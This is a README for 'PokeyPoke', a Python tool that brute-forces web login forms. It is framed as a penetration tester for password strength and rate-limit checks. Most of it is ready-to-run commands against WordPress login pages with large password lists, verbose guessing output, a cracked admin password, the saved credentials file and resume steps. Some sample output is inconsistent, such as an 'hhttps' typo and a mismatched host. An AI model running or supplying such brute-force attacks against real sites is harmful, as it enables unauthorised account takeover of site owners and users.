# pokeypoke
### Brute force penetration tester

PokeyPoke is a simple threaded login form brute forcer written in Python 3.  The interface supports flexible form input names and should function for any non-captcha'd login forms which use CSRF or other similar hidden field authentication.  This tool is especially effective in testing group password strengths and the efficacy of brute-force prevention plugins or methodologies, such as IP-based ratelimiting and etc.

NOTE: This tool is only as effective as the password list used.  Various lists are available from security services which provide granular targeting based on the installation (WordPress, Joomla, etc) and are compiled into top N (100, 1000, 100000, etc) lists for rapid checking of the most commonly found passwords.

### Usage
```
usage: pokeypoke.py [-h] [-m MAX_THREADS] -w WORD_LIST -t
                    [TARGET [TARGET ...]] [-v] [-C] [-u UNAME_FIELD]
                    [-p PASSWD_FIELD] [-r RESUME]
                    [-s [SUCCESS_STR [SUCCESS_STR ...]]]
                    [-U [USERNAME [USERNAME ...]]] [-o OUTFILE] [--wp]
                    [--joomla]

optional arguments:
  -h, --help            show this help message and exit
  -m MAX_THREADS, --max-threads MAX_THREADS
                        Maximum concurrent worker threads
  -w WORD_LIST, --word-list WORD_LIST
                        Path to word list
  -t [TARGET [TARGET ...]], --target [TARGET [TARGET ...]]
                        Target URL(s)
  -v, --verbose         Enable verbose output
  -C, --nocolor         Suppress colors in output
  -u UNAME_FIELD, --uname-field UNAME_FIELD
                        Login form username field name
  -p PASSWD_FIELD, --passwd-field PASSWD_FIELD
                        Login form password field name
  -r RESUME, --resume RESUME
                        Resume from a certain word (for termed attempts)
  -s [SUCCESS_STR [SUCCESS_STR ...]], --success-str [SUCCESS_STR [SUCCESS_STR ...]]
                        Successful login identifier string(s)
  -U [USERNAME [USERNAME ...]], --username [USERNAME [USERNAME ...]]
                        Login username(s) to attempt
  -o OUTFILE, --outfile OUTFILE
                        Discovered credential output
  --wp                  Use WordPress form element names
  --joomla              Use Joomla form element names
```
--target & --word-list are required when executing via the command line.  When seeking WordPress or Joomla targets, use the --wp or --joomla flags, which set appropriate login form element names and success strings.
```
# python pokeypoke.py --word-list ../.lists/10million.txt --target https://test.us/wp-login.php --username admin -v --wp
[*] PokeyPoke v0.1a (Development Version)
[*] Argument Summary
 -  Target(s)           : https://test.us/wp-login.php
 -  Max Threads         : 5
 -  Word List           : ../.lists/10million.txt
 -  Username Field      : log
 -  Password Field      : pwd
 -  Resume On           : None
 -  Success String(s)   : Logged In, Welcome to your WordPress Dashboard!
 -  Verbose             : True
 -  No Color            : False
 -  Username(s)         : admin
 -  Output File         : creds.20170718-173742.txt
 -  WordPress           : True
 -  Joomla              : False
 -  Seeking target: https://pokeybill.us/btester/wp-login.php
 -  Found 1000000 words
 -  Trying 123456, 999999 words remain
 -  Trying password, 999998 words remain
 -  Trying 12345678, 999997 words remain
 -  Trying qwerty, 999996 words remain
 -  Trying 123456789, 999995 words remain
 -  Trying 12345, 999994 words remain
 -  Trying 1234, 999993 words remain
 -  Trying 111111, 999992 words remain
 -  Trying 1234567, 999991 words remain
 -  Trying dragon, 999990 words remain
 -  Trying 123123, 999989 words remain
 -  Trying baseball, 999988 words remain
 -  Trying abc123, 999987 words remain
 -  Trying football, 999986 words remain
 -  Trying monkey, 999985 words remain
 -  Logged in: Welcome to your WordPress Dashboard!
[!] Target: https://test.us/wp-login.php :: Password for admin: dragon
 -  Writing output to creds.20170718-173742.txt
[*] Completed
```
The --target, --username, and --success-str options each support multiple space-delimited arguments.
```
# python pokeypoke.py --word-list ../.lists/10million.txt --target https://test.us/wp-login.php https://test1.us/wp-login.php --username admin user otheruser -v --wp --success-str 'Welcome, Admin!' 'Welcome, Bill!'
[*] PokeyPoke v0.1a (Development Version)
[*] Argument Summary
 -  Target(s)           : hhttps://test.us/wp-login.php, https://test1.us/wp-login.php
 -  Max Threads         : 5
 -  Word List           : ../.lists/10million.txt
 -  Username Field      : log
 -  Password Field      : pwd
 -  Resume On           : None
 -  Success String(s)   : Welcome, Admin!, Welcome, Bill!, Welcome to your WordPress Dashboard!
 -  Verbose             : True
 -  No Color            : False
 -  Username(s)         : admin, user, otheruser
 -  Output File         : creds.20170718-174346.txt
 -  WordPress           : True
 -  Joomla              : False
 -  Seeking target: https://test.us/wp-login.php
...
```
Consecutive target hits are each appended to the result file, one entry per line.
```
# cat creds.20170718-173742.txt 
https://test.us/wp-login.php:username=admin:password=dragon
https://test1.us/wp-login.php:username=user:password=1234567
```
When interrupted, the next word in queue to be processed is presented.  This can be used with the --resume flag to pick up at a specific point in the password list.
```
# python pokeypoke.py --word-list ../.lists/10million.txt --target https://test.us/wp-login.php -v --wp               
[*] PokeyPoke v0.1a (Development Version)
[*] Argument Summary
 -  Target(s)           : https://test.us/wp-login.php
 -  Max Threads         : 5
 -  Word List           : ../.lists/10million.txt
 -  Username Field      : log
 -  Password Field      : pwd
 -  Resume On           : None
 -  Success String(s)   : Logged In, Welcome to your WordPress Dashboard!
 -  Verbose             : True
 -  No Color            : False
 -  Username(s)         : admin
 -  Output File         : creds.20170718-175456.txt
 -  WordPress           : True
 -  Joomla              : False
 -  Seeking target: https://test.us/wp-login.php
 -  Found 1000000 words
 -  Trying 123456, 999999 words remain
 -  Trying password, 999998 words remain
 -  Trying 12345678, 999997 words remain
 -  Trying qwerty, 999996 words remain
 -  Trying 123456789, 999995 words remain
 -  Trying 12345, 999994 words remain
 -  Trying 1234, 999993 words remain
^C -  Resume on: 111111
[*] Completed

# python pokeypoke.py --word-list ../.lists/10million.txt --target https://test.us/wp-login.php -v --wp --resume 111111
[*] PokeyPoke v0.1a (Development Version)
[*] Argument Summary
 -  Target(s)           : https://test.us/wp-login.php
 -  Max Threads         : 5
 -  Word List           : ../.lists/10million.txt
 -  Username Field      : log
 -  Password Field      : pwd
 -  Resume On           : 111111
 -  Success String(s)   : Logged In, Welcome to your WordPress Dashboard!
 -  Verbose             : True
 -  No Color            : False
 -  Username(s)         : admin
 -  Output File         : creds.20170718-175510.txt
 -  WordPress           : True
 -  Joomla              : False
 -  Seeking target: https://test.us/wp-login.php
 -  Resuming from 111111
 -  Found 999992 words
 -  Trying 1234567, 999991 words remain
 -  Trying dragon, 999990 words remain
 -  Trying 123123, 999989 words remain
 -  Trying baseball, 999988 words remain
 -  Trying abc123, 999987 words remain
 -  Trying football, 999986 words remain
 -  Trying monkey, 999985 words remain
 -  Trying letmein, 999984 words remain
 -  Trying 696969, 999983 words remain
 -  Logged in: Welcome to your WordPress Dashboard!
[!] Target: https://test.us/wp-login.php :: Password for admin: dragon
 -  Writing output to creds.20170718-175510.txt
[*] Completed
```
